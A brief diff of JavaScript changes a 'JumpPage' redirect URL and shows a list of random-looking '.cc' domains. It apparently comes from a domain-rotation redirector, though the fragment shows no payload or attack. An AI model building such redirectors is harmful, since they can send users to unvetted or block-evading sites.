@@ -47,7 +47,7 @@ var urls=[];
         urls.push(".briiimf.cc");
         urls.push(".crwspck.cc");    
            
-var JumpPage="https://owifjrk.com";
+var JumpPage="https://pzmtnmb.com";
 
 var newestUrls = [];
 
